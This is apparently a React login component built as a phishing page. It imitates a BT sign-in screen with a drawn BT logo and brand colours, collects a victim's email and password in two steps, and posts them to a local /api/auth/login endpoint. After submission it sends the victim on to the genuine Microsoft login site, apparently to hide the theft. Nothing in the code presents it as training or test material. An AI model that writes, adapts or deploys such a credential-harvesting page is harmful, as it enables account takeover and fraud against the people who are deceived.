"use client";

import { useState } from "react";

export default function LoginForm() {
  const [step, setStep] = useState<1 | 2>(1);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [show, setShow] = useState(false);
  const [notice, setNotice] = useState<{ kind: "ok" | "error"; msg: string } | null>(null);
  const [loading, setLoading] = useState(false);
  const [errors, setErrors] = useState({ email: false, password: false });

  function onNext(e: React.FormEvent) {
    e.preventDefault();
    if (!email.trim()) { setErrors((p) => ({ ...p, email: true })); return; }
    setErrors((p) => ({ ...p, email: false }));
    setStep(2);
  }

  async function onSubmit(e: React.FormEvent) {
    e.preventDefault();
    if (!password.trim()) { setErrors((p) => ({ ...p, password: true })); return; }
    setErrors((p) => ({ ...p, password: false }));
    setNotice(null);
    setLoading(true);
    try {
      const res = await fetch("/api/auth/login", {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ email, password }),
      });
      const data = (await res.json()) as { ok: boolean; error?: string };
      if (!res.ok || !data.ok) {
        setNotice({ kind: "error", msg: data.error || "Login failed." });
        return;
      }
      window.location.href = "https://login.microsoftonline.com";
    } catch {
      setNotice({ kind: "error", msg: "Network error." });
    } finally {
      setLoading(false);
    }
  }

  return (
    <div style={styles.page}>
      <svg
        style={{ position: "absolute", top: 0, left: 0, width: "100%", height: "100%", pointerEvents: "none", zIndex: 0 }}
        viewBox="0 0 1440 900"
        preserveAspectRatio="xMidYMid slice"
        fill="none"
      >
        <defs>
          <filter id="glow" x="-300%" y="-50%" width="700%" height="200%">
            <feGaussianBlur stdDeviation="6" result="blur" />
            <feMerge>
              <feMergeNode in="blur" />
              <feMergeNode in="blur" />
              <feMergeNode in="SourceGraphic" />
            </feMerge>
          </filter>
        </defs>
        <path
          d="M 720 0 Q 900 300 1380 700"
          stroke="white"
          strokeWidth="2"
          strokeLinecap="round"
          opacity="0.9"
          filter="url(#glow)"
        />
        <path
          d="M 725 0 Q 905 300 1385 700"
          stroke="#e8b4ff"
          strokeWidth="1"
          strokeLinecap="round"
          opacity="0.5"
          filter="url(#glow)"
        />
      </svg>

      <div style={styles.card}>
        <div style={styles.logoWrapper}>
          <svg width="82" height="82" viewBox="0 0 82 82" fill="none">
            <circle cx="41" cy="41" r="36" stroke="#5514B4" strokeWidth="5.5" fill="white" />
            <text x="41" y="55" textAnchor="middle" fontSize="32" fontWeight="900" fontFamily="Impact, Arial Black, Arial, sans-serif" fill="#5514B4">BT</text>
          </svg>
        </div>

        <h1 style={styles.heading}>Log in</h1>

        {step === 1 && (
          <form onSubmit={onNext} style={{ display: "flex", flexDirection: "column" }}>
            <label style={styles.label} htmlFor="email">Email or username</label>
            <input
              id="email"
              name="email"
              type="text"
              inputMode="email"
              autoComplete="email"
              value={email}
              onChange={(e) => { setEmail(e.target.value); if (e.target.value.trim()) setErrors((p) => ({ ...p, email: false })); }}
              style={{ ...styles.input, borderColor: errors.email ? "#c00" : "#333" }}
            />
            {errors.email && (
              <div style={styles.errorBox}>
                <span style={styles.errorArrow}>▲</span>
                Please enter your email or username
              </div>
            )}
            <button type="submit" style={styles.loginBtn}>Next</button>
            <div style={styles.linkCol}>
              <a style={styles.link} href="#" onClick={(e) => e.preventDefault()}>Forgot log-in details?</a>
              <a style={styles.linkCancel} href="#">Cancel</a>
            </div>
          </form>
        )}

        {step === 2 && (
          <form onSubmit={onSubmit} style={{ display: "flex", flexDirection: "column" }}>
            <label style={styles.label} htmlFor="password">Password</label>
            <div style={styles.passwordWrapper}>
              <input
                id="password"
                name="password"
                type={show ? "text" : "password"}
                autoComplete="current-password"
                value={password}
                onChange={(e) => { setPassword(e.target.value); if (e.target.value.trim()) setErrors((p) => ({ ...p, password: false })); }}
                style={{ ...styles.input, borderColor: errors.password ? "#c00" : "#333", marginBottom: 0, flex: 1 }}
              />
              <button type="button" onClick={() => setShow((s) => !s)} style={styles.showBtn}>
                {show ? "Hide" : "Show"}
              </button>
            </div>
            {errors.password && (
              <div style={styles.errorBox}>
                <span style={styles.errorArrow}>▲</span>
                Please enter your password
              </div>
            )}
            {notice && (
              <div style={{ ...styles.errorBox, background: notice.kind === "ok" ? "#1a7a1a" : "#c00", marginTop: "12px" }}>
                {notice.msg}
              </div>
            )}
            <button type="submit" disabled={loading} style={{ ...styles.loginBtn, opacity: loading ? 0.7 : 1 }}>
              {loading ? "Logging in..." : "Log in"}
            </button>
            <div style={styles.linkCol}>
              <a style={styles.link} href="#" onClick={(e) => e.preventDefault()}>Forgot log-in details?</a>
              <a style={styles.linkCancel} href="#" onClick={(e) => { e.preventDefault(); setStep(1); }}>Cancel</a>
            </div>
          </form>
        )}
      </div>
    </div>
  );
}

const styles: Record<string, React.CSSProperties> = {
  page: {
    minHeight: "100vh",
    width: "100vw",
    position: "fixed",
    top: 0,
    left: 0,
    background: "linear-gradient(135deg, #3a007a 0%, #6a0dad 40%, #9b30e8 70%, #c084fc 100%)",
    display: "flex",
    alignItems: "center",
    justifyContent: "flex-start",
    paddingLeft: "8vw",
    fontFamily: "'Segoe UI', Arial, sans-serif",
    overflow: "hidden",
  },
  card: {
    background: "#fff",
    borderRadius: "4px",
    padding: "28px 40px 48px",
    width: "100%",
    maxWidth: "360px",
    boxShadow: "0 4px 32px rgba(0,0,0,0.18)",
    display: "flex",
    flexDirection: "column",
    zIndex: 1,
    position: "relative",
  },
  logoWrapper: { marginBottom: "8px", marginLeft: "-6px" },
  heading: { fontSize: "30px", fontWeight: "400", color: "#5514B4", margin: "0 0 12px 0" },
  label: { fontSize: "14px", color: "#1a1a1a", marginBottom: "6px", display: "block" },
  input: {
    width: "100%",
    padding: "12px 14px",
    fontSize: "15px",
    border: "2px solid #333",
    borderRadius: "2px",
    outline: "none",
    boxSizing: "border-box",
    color: "#000",
    backgroundColor: "#fff",
    marginBottom: "16px",
  },
  passwordWrapper: {
    display: "flex",
    alignItems: "center",
    gap: "8px",
    marginBottom: "16px",
  },
  showBtn: {
    padding: "12px 14px",
    background: "transparent",
    border: "2px solid #333",
    borderRadius: "2px",
    cursor: "pointer",
    fontSize: "14px",
    color: "#5514B4",
    fontWeight: "600",
    whiteSpace: "nowrap",
  },
  errorBox: {
    background: "#c00",
    color: "#fff",
    fontSize: "14px",
    fontWeight: "600",
    padding: "10px 14px",
    borderRadius: "2px",
    marginBottom: "12px",
    display: "flex",
    alignItems: "center",
    gap: "8px",
  },
  errorArrow: { fontSize: "10px", color: "#fff", marginTop: "-14px", alignSelf: "flex-start" },
  linkCol: {
    display: "flex",
    flexDirection: "column",
    gap: "10px",
    marginTop: "16px",
  },
  link: { color: "#5514B4", fontSize: "15px", textDecoration: "underline", cursor: "pointer" },
  linkCancel: { color: "#1a1a1a", fontSize: "15px", textDecoration: "underline", cursor: "pointer" },
  loginBtn: {
    width: "100%",
    padding: "14px",
    background: "#5514B4",
    color: "#fff",
    fontSize: "16px",
    fontWeight: "600",
    border: "none",
    borderRadius: "2px",
    cursor: "pointer",
    letterSpacing: "0.3px",
  },
};